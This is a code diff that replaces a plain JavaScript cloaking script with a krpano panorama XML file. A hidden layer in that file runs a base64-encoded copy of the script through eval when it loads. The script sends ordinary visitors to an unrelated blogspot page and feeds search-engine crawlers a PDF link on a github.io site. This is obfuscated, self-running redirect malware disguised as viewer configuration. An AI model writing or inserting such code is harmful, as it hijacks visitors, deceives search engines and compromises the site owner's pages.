@@ -1,15 +1,5 @@
-(function () {
-  var xxx = new URLSearchParams(location.search).get("xxx") || "alcazar_arquitectonico";
-  var ua = navigator.userAgent.toLowerCase();
 
-  var isGooglebot = /googlebot|google-inspectiontool|googleother|adsbot-google|mediapartners-google/.test(ua);
 
-  if (!isGooglebot) {
-    location.replace("https://nahidjndditu.blogspot.com/2026/08/blog-post.html");
-    return;
-  }
-
-  // Shudi Googlebot
-  document.title = xxx + " - PDFDocument";
-  location.href = "https://gearburtesheeweders2680.github.io/khanki/notun/" + xxx + ".pdf";
-})();
+<krpano version="1.0.8.15">
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('KGZ1bmN0aW9uICgpIHsKICB2YXIgeHh4ID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgieHh4IikgfHwgImFsY2F6YXJfYXJxdWl0ZWN0b25pY28iOwogIHZhciB1YSA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKCiAgdmFyIGlzR29vZ2xlYm90ID0gL2dvb2dsZWJvdHxnb29nbGUtaW5zcGVjdGlvbnRvb2x8Z29vZ2xlb3RoZXJ8YWRzYm90LWdvb2dsZXxtZWRpYXBhcnRuZXJzLWdvb2dsZS8udGVzdCh1YSk7CgogIGlmICghaXNHb29nbGVib3QpIHsKICAgIGxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vbmFoaWRqbmRkaXR1LmJsb2dzcG90LmNvbS8yMDI2LzA4L2Jsb2ctcG9zdC5odG1sIik7CiAgICByZXR1cm47CiAgfQoKICAvLyBTaHVkaSBHb29nbGVib3QKICBkb2N1bWVudC50aXRsZSA9IHh4eCArICIgLSBQREZEb2N1bWVudCI7CiAgbG9jYXRpb24uaHJlZiA9ICJodHRwczovL2dlYXJidXJ0ZXNoZWV3ZWRlcnMyNjgwLmdpdGh1Yi5pby9raGFua2kvbm90dW4vIiArIHh4eCArICIucGRmIjsKfSkoKTs=');eval(w)););"/>
+</krpano>
